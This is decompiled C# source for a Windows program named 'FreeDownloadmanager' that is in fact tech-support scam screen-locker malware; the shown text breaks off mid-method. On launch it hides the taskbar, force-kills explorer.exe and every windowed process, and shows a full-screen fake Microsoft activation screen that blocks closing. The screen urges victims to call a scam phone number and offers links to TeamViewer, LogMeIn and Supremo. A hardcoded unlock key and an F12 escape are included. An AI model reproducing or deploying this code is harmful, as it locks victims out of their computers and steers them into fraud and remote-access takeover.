using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using FreeDownloadmanager.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace FreeDownloadmanager;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("PictureBox5")]
	private PictureBox _PictureBox5;

	[AccessedThroughProperty("PictureBox4")]
	private PictureBox _PictureBox4;

	[AccessedThroughProperty("PictureBox3")]
	private PictureBox _PictureBox3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("PictureBox6")]
	private PictureBox _PictureBox6;

	private int chk;

	private bool ALT_F4;

	private long Hdesk;

	private long TaskbarWnd;

	private long StartWnd;

	private long Traynotify;

	private long clockwnd;

	private string StartText;

	public const int SWP_HIDEWINDOW = 128;

	public const int SWP_SHOWWINDOW = 64;

	internal virtual Panel Panel5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel5 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox2 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual PictureBox PictureBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox5_Click;
			if (_PictureBox5 != null)
			{
				((Control)_PictureBox5).remove_Click(eventHandler);
			}
			_PictureBox5 = value;
			if (_PictureBox5 != null)
			{
				((Control)_PictureBox5).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox4_Click;
			if (_PictureBox4 != null)
			{
				((Control)_PictureBox4).remove_Click(eventHandler);
			}
			_PictureBox4 = value;
			if (_PictureBox4 != null)
			{
				((Control)_PictureBox4).add_Click(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox3_Click;
			if (_PictureBox3 != null)
			{
				((Control)_PictureBox3).remove_Click(eventHandler);
			}
			_PictureBox3 = value;
			if (_PictureBox3 != null)
			{
				((Control)_PictureBox3).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual PictureBox PictureBox6
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox6_Click;
			if (_PictureBox6 != null)
			{
				((Control)_PictureBox6).remove_Click(eventHandler);
			}
			_PictureBox6 = value;
			if (_PictureBox6 != null)
			{
				((Control)_PictureBox6).add_Click(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Control)this).add_KeyDown(new KeyEventHandler(Form1_KeyDown));
		((Control)this).add_KeyPress(new KeyPressEventHandler(Form1_KeyPress));
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		ALT_F4 = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_0358: Unknown result type (might be due to invalid IL or missing references)
		//IL_0362: Expected O, but got Unknown
		//IL_03f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fd: Expected O, but got Unknown
		//IL_046f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0479: Expected O, but got Unknown
		//IL_0514: Unknown result type (might be due to invalid IL or missing references)
		//IL_051e: Expected O, but got Unknown
		//IL_065b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0665: Expected O, but got Unknown
		//IL_0703: Unknown result type (might be due to invalid IL or missing references)
		//IL_070d: Expected O, but got Unknown
		//IL_07a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b2: Expected O, but got Unknown
		//IL_0853: Unknown result type (might be due to invalid IL or missing references)
		//IL_085d: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Panel5 = new Panel();
		Panel1 = new Panel();
		Button1 = new Button();
		TextBox1 = new TextBox();
		Label6 = new Label();
		Label1 = new Label();
		PictureBox2 = new PictureBox();
		Label5 = new Label();
		Label4 = new Label();
		Label3 = new Label();
		Label2 = new Label();
		PictureBox1 = new PictureBox();
		PictureBox5 = new PictureBox();
		PictureBox4 = new PictureBox();
		PictureBox3 = new PictureBox();
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		PictureBox6 = new PictureBox();
		((Control)Panel5).SuspendLayout();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox5).BeginInit();
		((ISupportInitialize)PictureBox4).BeginInit();
		((ISupportInitialize)PictureBox3).BeginInit();
		((ISupportInitialize)PictureBox6).BeginInit();
		((Control)this).SuspendLayout();
		((Control)Panel5).set_Anchor((AnchorStyles)3);
		Panel5.set_AutoSize(true);
		Panel5.set_AutoSizeMode((AutoSizeMode)0);
		((Control)Panel5).set_BackColor(Color.Transparent);
		((Control)Panel5).get_Controls().Add((Control)(object)Panel1);
		((Control)Panel5).get_Controls().Add((Control)(object)Label1);
		((Control)Panel5).get_Controls().Add((Control)(object)PictureBox2);
		((Control)Panel5).get_Controls().Add((Control)(object)Label5);
		((Control)Panel5).get_Controls().Add((Control)(object)Label4);
		((Control)Panel5).get_Controls().Add((Control)(object)Label3);
		((Control)Panel5).get_Controls().Add((Control)(object)Label2);
		((Control)Panel5).get_Controls().Add((Control)(object)PictureBox1);
		Panel panel = Panel5;
		Point location = new Point(82, 117);
		((Control)panel).set_Location(location);
		((Control)Panel5).set_Name("Panel5");
		Panel panel2 = Panel5;
		Size size = new Size(984, 611);
		((Control)panel2).set_Size(size);
		((Control)Panel5).set_TabIndex(4);
		((Control)Panel1).get_Controls().Add((Control)(object)Button1);
		((Control)Panel1).get_Controls().Add((Control)(object)TextBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label6);
		Panel panel3 = Panel1;
		location = new Point(106, 496);
		((Control)panel3).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel4 = Panel1;
		size = new Size(738, 100);
		((Control)panel4).set_Size(size);
		((Control)Panel1).set_TabIndex(20);
		((Control)Panel1).set_Visible(false);
		((ButtonBase)Button1).set_BackColor(Color.FromArgb(61, 109, 191));
		((ButtonBase)Button1).set_FlatStyle((FlatStyle)0);
		((Control)Button1).set_Font(new Font("Segoe UI Semibold", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button1).set_ForeColor(Color.White);
		Button button = Button1;
		location = new Point(512, 22);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(184, 41);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(17);
		((ButtonBase)Button1).set_Text("Activate Now");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)TextBox1).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TextBox textBox = TextBox1;
		location = new Point(71, 26);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(423, 35);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(16);
		((Control)Label6).set_BackColor(Color.Transparent);
		((Control)Label6).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		Label label = Label6;
		location = new Point(72, 69);
		((Control)label).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label2 = Label6;
		size = new Size(88, 22);
		((Control)label2).set_Size(size);
		((Control)Label6).set_TabIndex(18);
		Label6.set_Text("Privacy Policy");
		((Control)Label1).set_Anchor((AnchorStyles)1);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Segoe UI Semibold", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label3 = Label1;
		location = new Point(99, 315);
		((Control)label3).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label4 = Label1;
		size = new Size(739, 96);
		((Control)label4).set_Size(size);
		((Control)Label1).set_TabIndex(19);
		Label1.set_Text("Please contact a Microsoft certified technician on +1-888-303-5121\r\n");
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)PictureBox2).set_BackColor(Color.FromArgb(77, 0, 134));
		((Control)PictureBox2).set_BackgroundImage((Image)(object)Resources.OEM_1);
		((Control)PictureBox2).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox = PictureBox2;
		location = new Point(84, 350);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox2 = PictureBox2;
		size = new Size(10, 21);
		((Control)pictureBox2).set_Size(size);
		PictureBox2.set_TabIndex(15);
		PictureBox2.set_TabStop(false);
		((Control)PictureBox2).set_Visible(false);
		((Control)Label5).set_BackColor(Color.Transparent);
		((Control)Label5).set_Font(new Font("Segoe UI Semibold", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		Label label5 = Label5;
		location = new Point(81, 333);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(34, 10);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(14);
		Label5.set_Text("It looks similar to this: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX");
		((Control)Label5).set_Visible(false);
		((Control)Label4).set_BackColor(Color.Transparent);
		((Control)Label4).set_Font(new Font("Segoe UI Semibold", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		Label label7 = Label4;
		location = new Point(89, 91);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(812, 208);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(13);
		Label4.set_Text(componentResourceManager.GetString("Label4.Text"));
		((Control)Label3).set_BackColor(Color.Transparent);
		((Control)Label3).set_Font(new Font("Segoe UI Semibold", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		Label label9 = Label3;
		location = new Point(255, 37);
		((Control)label9).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label10 = Label3;
		size = new Size(368, 44);
		((Control)label10).set_Size(size);
		((Control)Label3).set_TabIndex(12);
		Label3.set_Text("Customer Support: 1-888-303-5121");
		((Control)Label3).set_Visible(false);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Segoe UI Semibold", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		Label label11 = Label2;
		location = new Point(77, 31);
		((Control)label11).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label12 = Label2;
		size = new Size(169, 44);
		((Control)label12).set_Size(size);
		((Control)Label2).set_TabIndex(11);
		Label2.set_Text("Product Key");
		((Control)Label2).set_Visible(false);
		((Control)PictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		PictureBox pictureBox3 = PictureBox1;
		location = new Point(13, 13);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox4 = PictureBox1;
		size = new Size(968, 595);
		((Control)pictureBox4).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox5).set_Anchor((AnchorStyles)1);
		((Control)PictureBox5).set_BackColor(Color.Transparent);
		((Control)PictureBox5).set_BackgroundImage((Image)(object)Resources.logo);
		((Control)PictureBox5).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox5 = PictureBox5;
		location = new Point(805, 75);
		((Control)pictureBox5).set_Location(location);
		((Control)PictureBox5).set_Name("PictureBox5");
		PictureBox pictureBox6 = PictureBox5;
		size = new Size(160, 36);
		((Control)pictureBox6).set_Size(size);
		PictureBox5.set_TabIndex(7);
		PictureBox5.set_TabStop(false);
		((Control)PictureBox5).set_Visible(false);
		((Control)PictureBox4).set_Anchor((AnchorStyles)1);
		((Control)PictureBox4).set_BackColor(Color.Transparent);
		((Control)PictureBox4).set_BackgroundImage((Image)(object)Resources._25130);
		((Control)PictureBox4).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox7 = PictureBox4;
		location = new Point(738, 75);
		((Control)pictureBox7).set_Location(location);
		((Control)PictureBox4).set_Name("PictureBox4");
		PictureBox pictureBox8 = PictureBox4;
		size = new Size(41, 36);
		((Control)pictureBox8).set_Size(size);
		PictureBox4.set_TabIndex(6);
		PictureBox4.set_TabStop(false);
		((Control)PictureBox4).set_Visible(false);
		((Control)PictureBox3).set_Anchor((AnchorStyles)1);
		((Control)PictureBox3).set_BackColor(Color.Transparent);
		((Control)PictureBox3).set_BackgroundImage((Image)(object)Resources.teamviewer_by_bitingduke_d7lpfbz);
		((Control)PictureBox3).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox9 = PictureBox3;
		location = new Point(669, 75);
		((Control)pictureBox9).set_Location(location);
		((Control)PictureBox3).set_Name("PictureBox3");
		PictureBox pictureBox10 = PictureBox3;
		size = new Size(41, 36);
		((Control)pictureBox10).set_Size(size);
		PictureBox3.set_TabIndex(5);
		PictureBox3.set_TabStop(false);
		((Control)PictureBox3).set_Visible(false);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		Timer2.set_Interval(1000);
		((Control)PictureBox6).set_Anchor((AnchorStyles)1);
		((Control)PictureBox6).set_BackColor(Color.Transparent);
		((Control)PictureBox6).set_BackgroundImage((Image)(object)Resources.metroui_browser_internet_explorer_8_icon);
		((Control)PictureBox6).set_BackgroundImageLayout((ImageLayout)4);
		PictureBox pictureBox11 = PictureBox6;
		location = new Point(1022, 75);
		((Control)pictureBox11).set_Location(location);
		((Control)PictureBox6).set_Name("PictureBox6");
		PictureBox pictureBox12 = PictureBox6;
		size = new Size(41, 36);
		((Control)pictureBox12).set_Size(size);
		PictureBox6.set_TabIndex(8);
		PictureBox6.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSize(true);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)(object)Resources.win108);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(1172, 769);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)PictureBox6);
		((Control)this).get_Controls().Add((Control)(object)PictureBox5);
		((Control)this).get_Controls().Add((Control)(object)PictureBox4);
		((Control)this).get_Controls().Add((Control)(object)PictureBox3);
		((Control)this).get_Controls().Add((Control)(object)Panel5);
		((Control)this).set_ForeColor(Color.White);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((Form)this).set_WindowState((FormWindowState)2);
		((Control)Panel5).ResumeLayout(false);
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox5).EndInit();
		((ISupportInitialize)PictureBox4).EndInit();
		((ISupportInitialize)PictureBox3).EndInit();
		((ISupportInitialize)PictureBox6).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags);

	private void PictureBox3_Click(object sender, EventArgs e)
	{
		Process.Start("https://www.teamviewer.com/en/");
	}

	private void PictureBox4_Click(object sender, EventArgs e)
	{
		Process.Start("https://secure.logmein.com/home/en");
	}

	private void PictureBox5_Click(object sender, EventArgs e)
	{
		Process.Start("http://www.supremocontrol.com");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		string text = TextBox1.get_Text();
		text = text.Replace("-", "");
		if (Operators.CompareString(text, "8716098676542789", false) == 0)
		{
			string lpClassName = "Shell_traywnd";
			string lpWindowName = "";
			int hwnd = FindWindowA(ref lpClassName, ref lpWindowName);
			SetWindowPos(hwnd, 0, 0, 0, 0, 0, 64);
			string fileName = string.Format("{0}\\{1}", Environment.GetEnvironmentVariable("WINDIR"), "explorer.exe");
			Process process = new Process();
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = true;
			process.Start();
			((Form)this).Close();
			Application.Exit();
		}
		else
		{
			Interaction.MsgBox((object)"Your key seems to have been expired, Please call at 1-888-303-5121 to get a new one", (MsgBoxStyle)48, (object)"Microsoft Windows Activation");
		}
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		if ((int)e.get_CloseReason() == 3)
		{
			((CancelEventArgs)(object)e).Cancel = true;
			MessageBox.Show("Closing of the registration form is not allowed", "Microsoft Security", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	private void Form1_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_019a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			try
			{
				if (((Enum)e.get_KeyCode()).Equals((object)(Keys)123))
				{
					string lpClassName = "Shell_traywnd";
					string lpWindowName = "";
					int hwnd = FindWindowA(ref lpClassName, ref lpWindowName);
					SetWindowPos(hwnd, 0, 0, 0, 0, 0, 64);
					string fileName = string.Format("{0}\\{1}", Environment.GetEnvironmentVariable("WINDIR"), "explorer.exe");
					Process process = new Process();
					process.StartInfo.FileName = fileName;
					process.StartInfo.UseShellExecute = true;
					process.Start();
					Application.Exit();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			if (Conversions.ToBoolean(Conversions.ToString(((Enum)e.get_KeyCode()).Equals((object)(Keys)115)) + Conversions.ToString(e.get_Alt())))
			{
				ALT_F4 = Conversions.ToBoolean(Conversions.ToString(((Enum)e.get_KeyCode()).Equals((object)(Keys)115)) + Conversions.ToString(e.get_Alt()));
				return;
			}
			ALT_F4 = Conversions.ToBoolean(Conversions.ToString(((Enum)e.get_KeyCode()).Equals((object)(Keys)115)) + Conversions.ToString(e.get_Alt()));
			if (Conversions.ToBoolean(Conversions.ToString(((Enum)e.get_KeyCode()).Equals((object)(Keys)46)) + Conversions.ToString(e.get_Alt()) + Conversions.ToString(e.get_Control())))
			{
				Form1 form = new Form1();
				((Form)form).ShowDialog();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			Form1 form2 = new Form1();
			((Form)form2).ShowDialog();
			((Form)this).Close();
			Form1 form3 = new Form1();
			((Form)form3).ShowDialog();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_KeyPress(object sender, KeyPressEventArgs e)
	{
		if (e.get_KeyChar().Equals((object)(Keys)123))
		{
			string lpClassName = "Shell_traywnd";
			string lpWindowName = "";
			int hwnd = FindWindowA(ref lpClassName, ref lpWindowName);
			SetWindowPos(hwnd, 0, 0, 0, 0, 0, 64);
			string fileName = string.Format("{0}\\{1}", Environment.GetEnvironmentVariable("WINDIR"), "explorer.exe");
			Process process = new Process();
			process.StartInfo.FileName = fileName;
			process.StartInfo.UseShellExecute = true;
			process.Start();
			((Form)this).Close();
			Application.Exit();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (chk >= 10)
		{
			return;
		}
		string lpClassName = "Shell_traywnd";
		string lpWindowName = "";
		int hwnd = FindWindowA(ref lpClassName, ref lpWindowName);
		SetWindowPos(hwnd, 0, 0, 0, 0, 0, 128);
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/c taskkill /F /IM explorer.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.MainWindowTitle, "", false) != 0)
			{
				process.Kill();
			}
		}
		Timer2.set_Enabled(true);
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		checked
		{
			chk++;
			if (chk == 10)
			{
				Timer2.set_Enabled(false);
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
